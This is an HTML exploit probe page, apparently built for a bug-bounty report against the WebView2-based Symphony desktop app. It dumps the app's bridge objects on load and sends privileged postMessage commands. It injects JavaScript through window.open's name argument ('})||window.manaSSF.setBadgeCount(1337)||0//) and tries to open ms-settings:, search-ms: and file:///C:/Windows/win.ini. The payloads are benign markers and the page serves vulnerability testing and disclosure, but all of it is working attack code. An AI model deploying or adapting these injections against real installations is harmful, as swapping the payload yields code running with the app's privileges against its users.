<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>SDA Probe Page</title>
<style>
  body{font-family:monospace;background:#111;color:#eee;padding:16px;max-width:900px}
  button{font-size:15px;padding:9px 12px;margin:5px 4px;cursor:pointer}
  pre{background:#000;padding:12px;border:1px solid #333;white-space:pre-wrap}
  .warn{color:#f90}
</style>
</head>
<body>
<h1>SDA Probe Page v2 (Simons/Carter — yalnızca test VM'inde koş)</h1>
<p class="warn">Symphony SDA statik analiz probe'ları. Benign payload (badge=1337, toast metni). Sadece kendi test VM'inde ve <b>hackerone pod</b> gözlemi için.</p>

<button id="btnInfo">1) Bilgi Dump (otomatik de çalışır)</button>
<button id="btnToast">2) F1-TOAST (native toast denemesi)</button>
<button id="btnProto">3) F1-PROTO (tel: protokol kaydı denemesi)</button>
<button id="btnF3">4) F3-INJECT (window.open about:blank + payload)</button>
<button id="btnF3b">5) F3-INJECT (title marker varyantı)</button>
<button id="btnF4a">6) F4: ms-settings:display (window.open)</button>
<button id="btnF4b">7) F4: search-ms:query=probe (window.open)</button>
<button id="btnF4c">8) F4: file:///C:/Windows/win.ini (window.open)</button>
<button id="btnF4d">9) F4b: ms-settings:display (location.href navigasyon)</button>

<pre id="out">hazır. Bilgi dump için 1'e bas.</pre>

<script>
const out = [];
function log(k, v){ out.push(k + ": " + v); document.getElementById('out').textContent = out.join("\n"); }
function dumpInfo(){
  out.length = 0;
  log("location.href", location.href);
  log("location.origin", location.origin);
  log("navigator.userAgent", navigator.userAgent);
  log("window.manaSSF", typeof window.manaSSF);
  try { log("manaSSF keys", window.manaSSF ? Object.keys(window.manaSSF).join(",") : "n/a"); } catch(e){ log("manaSSF keys.err", e.message); }
  log("chrome.webview", (window.chrome && window.chrome.webview) ? "PRESENT" : "absent");
  try {
    const ho = window.chrome && window.chrome.webview ? window.chrome.webview.hostObjects : null;
    log("hostObjects", ho ? (Object.keys(ho).join(",") || "empty") : "n/a");
  } catch(e){ log("hostObjects.err", e.message); }
  log("crossOriginIsolated", window.crossOriginIsolated);
  log("hasOpener", !!window.opener);
}

document.getElementById('btnInfo').onclick = dumpInfo;
window.addEventListener('load', dumpInfo);

document.getElementById('btnToast').onclick = function(){
  try {
    window.chrome.webview.postMessage({
      command: "show-toast",
      payload: { id: "probe-toast-1", title: "SDA PROBE TOAST", body: "origin=" + location.origin, sticky: false }
    });
    log("F1-TOAST", "postMessage gönderildi");
  } catch(e){ log("F1-TOAST.err", e.message); }
};

document.getElementById('btnProto').onclick = function(){
  try {
    window.chrome.webview.postMessage({
      command: "register-phone-number-services",
      payload: { protocols: ["tel"] }
    });
    log("F1-PROTO", "postMessage gönderildi (HKCU gözlemi ProcMon ile)");
  } catch(e){ log("F1-PROTO.err", e.message); }
};

const F3_PAYLOAD_BADGE = "'})||window.manaSSF.setBadgeCount(1337)||0//";
const F3_PAYLOAD_TITLE = "'})||(document.title='SIMONS-PWNED')||0//";

document.getElementById('btnF3').onclick = function(){
  try {
    const w = window.open("about:blank", F3_PAYLOAD_BADGE);
    log("F3-INJECT", "window.open çağrıldı; popout=" + (w ? "olustu" : "null") + " | beklenen: SDA taskbar badge=1337");
  } catch(e){ log("F3-INJECT.err", e.message); }
};

document.getElementById('btnF3b').onclick = function(){
  try {
    const w = window.open("about:blank", F3_PAYLOAD_TITLE);
    log("F3-INJECT-title", "window.open çağrıldı; popout=" + (w ? "olustu" : "null") + " | beklenen: ana pencere title=SIMONS-PWNED");
  } catch(e){ log("F3-INJECT-title.err", e.message); }
};

document.getElementById('btnF4a').onclick = function(){
  try { const w = window.open("ms-settings:display"); log("F4a ms-settings (window.open)", w ? "pencere-ref alindi (bloklanmadi)" : "null — bloklanmis olabilir"); }
  catch(e){ log("F4a.err", e.message); }
};
document.getElementById('btnF4b').onclick = function(){
  try { const w = window.open("search-ms:query=probe"); log("F4b search-ms (window.open)", w ? "pencere-ref alindi (bloklanmadi)" : "null — bloklanmis olabilir"); }
  catch(e){ log("F4b.err", e.message); }
};
document.getElementById('btnF4c').onclick = function(){
  try { const w = window.open("file:///C:/Windows/win.ini"); log("F4c file (window.open)", w ? "pencere-ref alindi (bloklanmadi)" : "null — bloklanmis olabilir"); }
  catch(e){ log("F4c.err", e.message); }
};
document.getElementById('btnF4d').onclick = function(){
  try { log("F4d", "location.href atanıyor: ms-settings:display (sayfa giderse Settings açıldı demektir)"); location.href = "ms-settings:display"; }
  catch(e){ log("F4d.err", e.message); }
};
</script>
</body>
</html>
